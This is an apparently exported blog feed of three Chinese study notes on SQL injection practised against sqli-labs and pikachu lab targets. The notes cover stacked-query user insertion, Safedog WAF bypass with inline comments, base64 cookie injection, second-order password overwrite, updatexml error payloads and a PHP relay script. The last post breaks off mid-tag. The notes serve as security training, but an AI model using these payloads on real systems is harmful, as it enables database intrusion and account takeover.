<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>web安全日志-018</title>
      <link href="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/"/>
      <url>/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-堆叠及WAF绕过注入"><a href="#WEB漏洞-堆叠及WAF绕过注入" class="headerlink" title="WEB漏洞-堆叠及WAF绕过注入"></a><font size="6"><strong>WEB漏洞-堆叠及WAF绕过注入</strong></font></h2><span id="more"></span><h3 id="一、堆叠查询注入"><a href="#一、堆叠查询注入" class="headerlink" title="一、堆叠查询注入"></a><font size="5"><strong>一、堆叠查询注入</strong></font></h3><p>stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span> <span class="token keyword">select</span> * from emails<span class="token punctuation">;</span>+----+----------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password   <span class="token operator">|</span>+----+----------+------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angelina <span class="token operator">|</span> I-kill-you <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy    <span class="token operator">|</span> p@ssword   <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure   <span class="token operator">|</span> crappy     <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid   <span class="token operator">|</span> stupidity  <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman <span class="token operator">|</span> genious    <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman   <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin    <span class="token operator">|</span> 123456     <span class="token operator">|</span><span class="token operator">|</span>  9 <span class="token operator">|</span> admin1   <span class="token operator">|</span> admin1     <span class="token operator">|</span><span class="token operator">|</span> 10 <span class="token operator">|</span> admin2   <span class="token operator">|</span> admin2     <span class="token operator">|</span><span class="token operator">|</span> 11 <span class="token operator">|</span> admin3   <span class="token operator">|</span> admin3     <span class="token operator">|</span><span class="token operator">|</span> 12 <span class="token operator">|</span> dhakkan  <span class="token operator">|</span> dumbo      <span class="token operator">|</span><span class="token operator">|</span> 14 <span class="token operator">|</span> admin4   <span class="token operator">|</span> admin4     <span class="token operator">|</span><span class="token operator">|</span> 15 <span class="token operator">|</span> admin'<span class="token comment" spellcheck="true">#  | admin      |</span>+----+----------+------------+14 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>+----+------------------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> email_id               <span class="token operator">|</span>+----+------------------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb@dhakkan.com       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angel@iloveu.com       <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy@dhakkan.local    <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure@dhakkan.local   <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid@dhakkan.local   <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman@dhakkan.local <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman@dhakkan.local   <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin@dhakkan.com      <span class="token operator">|</span>+----+------------------------+8 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p>修改代码在前台上面显示</p><pre class=" language-bash"><code class="language-bash"> 46 <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span> 47 <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span> 48 /* execute multi query */^M 49 <span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span> 50 <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span> 51      52      53     /* store first result <span class="token keyword">set</span> */^M 54     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> mysqli_store_result<span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">))</span></code></pre><p>执行代码,访问网站</p><pre class=" language-bash"><code class="language-bash">http://10.1.1.133/Less-38/index.php?id<span class="token operator">=</span>1 <span class="token string">';insert into users(id,username,password) values ( 39, '</span>less38 <span class="token string">', '</span>hello '<span class="token punctuation">)</span>--+</code></pre><p><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/1.png"></p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>+----+----------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password   <span class="token operator">|</span>+----+----------+------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angelina <span class="token operator">|</span> I-kill-you <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy    <span class="token operator">|</span> p@ssword   <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure   <span class="token operator">|</span> crappy     <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid   <span class="token operator">|</span> stupidity  <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman <span class="token operator">|</span> genious    <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman   <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin    <span class="token operator">|</span> 123456     <span class="token operator">|</span><span class="token operator">|</span>  9 <span class="token operator">|</span> admin1   <span class="token operator">|</span> admin1     <span class="token operator">|</span><span class="token operator">|</span> 10 <span class="token operator">|</span> admin2   <span class="token operator">|</span> admin2     <span class="token operator">|</span><span class="token operator">|</span> 11 <span class="token operator">|</span> admin3   <span class="token operator">|</span> admin3     <span class="token operator">|</span><span class="token operator">|</span> 12 <span class="token operator">|</span> dhakkan  <span class="token operator">|</span> dumbo      <span class="token operator">|</span><span class="token operator">|</span> 14 <span class="token operator">|</span> admin4   <span class="token operator">|</span> admin4     <span class="token operator">|</span><span class="token operator">|</span> 15 <span class="token operator">|</span> admin'<span class="token comment" spellcheck="true">#  | admin      |</span><span class="token operator">|</span> 38 <span class="token operator">|</span> less38   <span class="token operator">|</span> hello      <span class="token operator">|</span>+----+----------+------------+15 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p>备注：堆叠注入的可以运用于创建用户由于我们使用网站用户进行注入不能查看到数据库的密码但是我们可以创建用户来登录迂回的注入数据库，但是前提是网站的管理员必须是高权限才能完全创建用户。也可以使用update更新管理员用户密码。</p><h3 id="二、waf部署"><a href="#二、waf部署" class="headerlink" title="二、waf部署"></a><font size="5"><strong>二、waf部署</strong></font></h3><p><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/2.png"><br>WAF部署-安全狗,宝塔等waf搭建部署</p><p>相关资源：<br>堆叠注入<br><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a><br>安全狗与phpstudy<br><a href="https://blog.csdn.net/nzjdsds/article/details/93740686">https://blog.csdn.net/nzjdsds/article/details/93740686</a></p><h3 id="三、部署安全狗"><a href="#三、部署安全狗" class="headerlink" title="三、部署安全狗"></a><font size="5"><strong>三、部署安全狗</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># wget http://download.safedog.cn/safedog_linux64.tar.gz</span></code></pre><p>备注：一般安装的时候可能会提示一些软件没有安装，只需要按照他提示的软件安装上即可。<br>安装好之后可以在命令提示符中执行以下命令</p><pre class=" language-bash"><code class="language-bash">root@37f786327043:/<span class="token comment" spellcheck="true"># service safedog start</span>root@37f786327043:/<span class="token comment" spellcheck="true"># service safedog status</span>safedog <span class="token function">service</span> is runningroot@37f786327043:/<span class="token comment" spellcheck="true"># service safedog stop</span>-e stop sdsvrd server <span class="token comment" spellcheck="true">#/etc/init.d/safedog: 45: [: &amp;#123;1..15&amp;#125;: unexpected operator</span>root@37f786327043:/<span class="token comment" spellcheck="true"># service safedog stop</span>-e stop sdsvrd server <span class="token comment" spellcheck="true">#/etc/init.d/safedog: 45: [: &amp;#123;1..15&amp;#125;: unexpected operator</span>root@37f786327043:/<span class="token comment" spellcheck="true"># service safedog status</span>safedog serivce is not runningroot@37f786327043:/<span class="token comment" spellcheck="true">#</span></code></pre><p>访问网站后面带一些参数例如’ and 1&#x3D;1<br><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/3.png"></p><p>通过更改数据提交方式，测试后发现上面显示的Please input the ID as parameter with numeric value 其实就是因为我们修改的方式是post而服务器接收的是get方法将数据包丢弃，所以出现这样的情况<br><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/4.png"></p><h4 id="将服务器的提交方式修改为request"><a href="#将服务器的提交方式修改为request" class="headerlink" title="将服务器的提交方式修改为request"></a><font size="4"><strong>将服务器的提交方式修改为request</strong></font></h4><pre class=" language-bash"><code class="language-bash">root@37f786327043:/var/www/html/Less-2<span class="token comment" spellcheck="true"># head -n 24 index.php |tail -3</span>if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/5.png"></p><p>获取数据库版本信息被安全狗给拦截<br><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/6.png"></p><p>绕过思路,这是mysql数据库所特有的</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> database/**/<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>+-------------+<span class="token operator">|</span> database <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span>+-------------+<span class="token operator">|</span> security    <span class="token operator">|</span>+-------------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/7.png"></p><h4 id="将服务器的提交方式修改为GET"><a href="#将服务器的提交方式修改为GET" class="headerlink" title="将服务器的提交方式修改为GET"></a><font size="4"><strong>将服务器的提交方式修改为GET</strong></font></h4><pre class=" language-bash"><code class="language-bash">root@37f786327043:/var/www/html/Less-2<span class="token comment" spellcheck="true"># head -n 24 index.php |tail -3</span>if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>root@37f786327043:/var/www/html/Less-2<span class="token comment" spellcheck="true">#</span></code></pre><p><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/8.png"></p><p>原理</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where id<span class="token operator">=</span>-1/*%0a*/union/*%0a*/select/*%0a*/1,2,3<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> 2        <span class="token operator">|</span> 3        <span class="token operator">|</span>+----+----------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p>在看视频操作的时候，由于我部署的是Linux的2.4版本很多的绕过方法都没有成功，下面不在演示，等到复习的时候在深入了解。</p><h3 id="四、相关资源："><a href="#四、相关资源：" class="headerlink" title="四、相关资源："></a><font size="5"><strong>四、相关资源：</strong></font></h3><p><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a><br><a href="https://blog.csdn.net/nzjdsds/article/details/93740686">https://blog.csdn.net/nzjdsds/article/details/93740686</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-017</title>
      <link href="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/"/>
      <url>/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-二次-加解密-DNS等注入"><a href="#WEB漏洞-二次-加解密-DNS等注入" class="headerlink" title="WEB漏洞-二次,加解密,DNS等注入"></a><font size="6"><strong>WEB漏洞-二次,加解密,DNS等注入</strong></font></h2><span id="more"></span><h3 id="一、加解密注入"><a href="#一、加解密注入" class="headerlink" title="一、加解密注入"></a><font size="5"><strong>一、加解密注入</strong></font></h3><p>sqlilabs-less21-cookie&amp;加解密注入(实际案例)<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/1.png"></p><p>抓取cookie数据包</p><pre class=" language-bash"><code class="language-bash">GET /Less-21/index.php HTTP/1.1Host: 10.1.1.133User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2Accept-Encoding: gzip, deflateReferer: http://10.1.1.133/Less-21/index.phpConnection: closeCookie: uname<span class="token operator">=</span>YWRtaW4%3DUpgrade-Insecure-Requests: 1</code></pre><p>YWRtaW4%3D这是一个base64加密的字符串其中%3D是编码中的&#x3D;符号，把他发送到编码模块当中解密,得到明文<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/2.png"></p><p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器。<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/3.png"></p><p>也就是说admin’ and 1&#x3D;1加密之后的值是YWRtaW4nIGFuZCAxPTE&#x3D;<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/4.png"></p><p>获取数据库名称admin’ or updatexml(1,concat(0x7e,(database())),0) or ‘加密后cookie值Cookie: uname&#x3D;YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSksMCkgb3IgJwo&#x3D;<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/5.png"><br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/6.png"></p><h3 id="二、二次注入"><a href="#二、二次注入" class="headerlink" title="二、二次注入"></a><font size="5"><strong>二、二次注入</strong></font></h3><p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/7.png"></p><p>sqlilabs-less24-post登陆框&amp;二次注入<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/8.png"></p><p>数据库中查询</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>+----+----------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password   <span class="token operator">|</span>+----+----------+------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angelina <span class="token operator">|</span> I-kill-you <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy    <span class="token operator">|</span> p@ssword   <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure   <span class="token operator">|</span> crappy     <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid   <span class="token operator">|</span> stupidity  <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman <span class="token operator">|</span> genious    <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman   <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin    <span class="token operator">|</span> admin      <span class="token operator">|</span><span class="token operator">|</span>  9 <span class="token operator">|</span> admin1   <span class="token operator">|</span> admin1     <span class="token operator">|</span><span class="token operator">|</span> 10 <span class="token operator">|</span> admin2   <span class="token operator">|</span> admin2     <span class="token operator">|</span><span class="token operator">|</span> 11 <span class="token operator">|</span> admin3   <span class="token operator">|</span> admin3     <span class="token operator">|</span><span class="token operator">|</span> 12 <span class="token operator">|</span> dhakkan  <span class="token operator">|</span> dumbo      <span class="token operator">|</span><span class="token operator">|</span> 14 <span class="token operator">|</span> admin4   <span class="token operator">|</span> admin4     <span class="token operator">|</span><span class="token operator">|</span> 15 <span class="token operator">|</span> admin'<span class="token comment" spellcheck="true">#  | admin      |</span>+----+----------+------------+14 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p>登录用户修改密码<br><img src="/2023/09/30/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-017/9.png"></p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>+----+----------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password   <span class="token operator">|</span>+----+----------+------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angelina <span class="token operator">|</span> I-kill-you <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy    <span class="token operator">|</span> p@ssword   <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure   <span class="token operator">|</span> crappy     <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid   <span class="token operator">|</span> stupidity  <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman <span class="token operator">|</span> genious    <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman   <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin    <span class="token operator">|</span> 123456     <span class="token operator">|</span><span class="token operator">|</span>  9 <span class="token operator">|</span> admin1   <span class="token operator">|</span> admin1     <span class="token operator">|</span><span class="token operator">|</span> 10 <span class="token operator">|</span> admin2   <span class="token operator">|</span> admin2     <span class="token operator">|</span><span class="token operator">|</span> 11 <span class="token operator">|</span> admin3   <span class="token operator">|</span> admin3     <span class="token operator">|</span><span class="token operator">|</span> 12 <span class="token operator">|</span> dhakkan  <span class="token operator">|</span> dumbo      <span class="token operator">|</span><span class="token operator">|</span> 14 <span class="token operator">|</span> admin4   <span class="token operator">|</span> admin4     <span class="token operator">|</span><span class="token operator">|</span> 15 <span class="token operator">|</span> admin'<span class="token comment" spellcheck="true">#  | admin      |</span>+----+----------+------------+14 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p>最后我们看到的是将admin的账户密码修改为了123456而admin’#并没有发生改变，原因是代码执行的过程中将’#没有过滤直接带入执行导致’与前面的代码闭合而#将后面的代码给注释。</p><h3 id="三、dnslog注入"><a href="#三、dnslog注入" class="headerlink" title="三、dnslog注入"></a><font size="5"><strong>三、dnslog注入</strong></font></h3><p>涉及资源：<a href="http://ceye.io/">http://ceye.io</a><br>参考资料：<a href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a><br>使用DnsLog盲注仅限于windos环境。</p><p>不知道啥子个情况dnslog在windows还是linux上就是没法运行缺少各种的库文件。所以先暂时放一段</p><h3 id="四、中转注入"><a href="#四、中转注入" class="headerlink" title="四、中转注入"></a><font size="5"><strong>四、中转注入</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$url</span><span class="token operator">=</span><span class="token string">'http://xxxx/job_bystjb/yjs_byszjs.asp?id='</span><span class="token punctuation">;</span><span class="token variable">$payload</span><span class="token operator">=</span>base64_encode<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span><span class="token variable">$urls</span><span class="token operator">=</span><span class="token variable">$url</span><span class="token keyword">.</span><span class="token variable">$payload</span><span class="token punctuation">;</span>file_get_contents<span class="token punctuation">(</span><span class="token variable">$urls</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$urls</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-016</title>
      <link href="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/"/>
      <url>/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-查询方式及报错盲注"><a href="#WEB漏洞-查询方式及报错盲注" class="headerlink" title="WEB漏洞-查询方式及报错盲注"></a><font size="6"><strong>WEB漏洞-查询方式及报错盲注</strong></font></h2><span id="more"></span><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a><font size="5"><strong>一、前言</strong></font></h3><p>前言：当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句。</p><h3 id="二、设计知识点"><a href="#二、设计知识点" class="headerlink" title="二、设计知识点"></a><font size="5"><strong>二、设计知识点</strong></font></h3><p>#补充:上课的Access暴力猜解不出的问题?</p><pre class=" language-bash"><code class="language-bash">Access扁移注入:解决列名获取不到的情况查看登陆框源代码的表单值或观察URL特征等也可以针对表或列获取不到的情况</code></pre><p>参考笔记：<a href="https://www.fujieace.com/penetration-test/access-offset-injection.html">https://www.fujieace.com/penetration-test/access-offset-injection.html</a></p><h4 id="1、SQL语句网站应用"><a href="#1、SQL语句网站应用" class="headerlink" title="1、SQL语句网站应用"></a><font size="4"><strong>1、SQL语句网站应用</strong></font></h4><pre class=" language-bash"><code class="language-bash">select查询数据在网站应用中进行数据显示查询操作例: <span class="token keyword">select</span> * from news where id<span class="token operator">=</span><span class="token variable">$id</span>insert插入数据在网站应用中进行用户注册添加等操作例: insert into news <span class="token punctuation">(</span>id, url,text<span class="token punctuation">)</span> values <span class="token punctuation">(</span> 2，<span class="token string">'x'</span>,<span class="token string">'<span class="token variable">$t</span>'</span><span class="token punctuation">)</span>delete删除数据后台管理里面删除文章删除用户等操作例: delete from news where id<span class="token operator">=</span><span class="token variable">$id</span>update更新数据会员或后台中心数据同步或缓存等操作例: update user <span class="token keyword">set</span> pwd<span class="token operator">=</span><span class="token string">'<span class="token variable">$p</span>'</span> where id<span class="token operator">=</span>2 and username<span class="token operator">=</span><span class="token string">' admin'</span>order by排序数据一般结合表名或列名进行数据排序操作例: <span class="token keyword">select</span> * from news order by <span class="token variable">$id</span>例: <span class="token keyword">select</span> <span class="token function">id</span> , name , price from news order by <span class="token variable">$order</span></code></pre><h3 id="三、SQL语句盲注"><a href="#三、SQL语句盲注" class="headerlink" title="三、SQL语句盲注"></a><font size="5"><strong>三、SQL语句盲注</strong></font></h3><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类:</p><pre class=" language-bash"><code class="language-bash">1、基于布尔的sQL盲注-逻辑判断 regexp, like , ascii,left, ord , mid2、基于时间的sQL盲注-延时判断 <span class="token keyword">if</span> ,sleep3、基于报错的sQL盲注-报错回显 floor, updatexml, extractvalue </code></pre><p>参考地址：<a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a>     <a href="https://developer.aliyun.com/article/692723">https://developer.aliyun.com/article/692723</a></p><p>首先了解下updatexml()函数1<br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值<br>而我们的注入语句为：</p><pre class=" language-bash"><code class="language-bash">updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>SELECT @@version<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span></code></pre><p>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出</p><pre class=" language-bash"><code class="language-bash">ERROR 1105 <span class="token punctuation">(</span>HY000<span class="token punctuation">)</span>: XPATH syntax error: <span class="token string">':root@localhost'</span></code></pre><p>使用pikachu靶场进行测试，使用docker搭建pikachu靶场<br>docker run -d -p 8000:80 area39&#x2F;pikachu:latest</p><h4 id="1、insert语句"><a href="#1、insert语句" class="headerlink" title="1、insert语句"></a><font size="4"><strong>1、insert语句</strong></font></h4><p><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/1.png"></p><p>用burp抓取数据包、并修改数据包</p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or updatexml(1,concat(0x7e,database(),0x7e),0) or'</span>username<span class="token operator">=</span>xiaodi<span class="token string">'or updatexml(1,concat(0x7e,version(),0x7e),0) or'</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>123456<span class="token operator">&amp;</span>sex<span class="token operator">=</span>man<span class="token operator">&amp;</span>phonenum<span class="token operator">=</span>138<span class="token operator">&amp;</span>email<span class="token operator">=</span>%E5%9B%9B%E5%B7%9D<span class="token operator">&amp;</span>add<span class="token operator">=</span>%E6%88%90%E9%83%BD<span class="token operator">&amp;</span>submit<span class="token operator">=</span>submit</code></pre><p>注意：将注意语句放在语句的其他位置是可以的注意看网站提交的数据。<br><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/2.png"><br><img 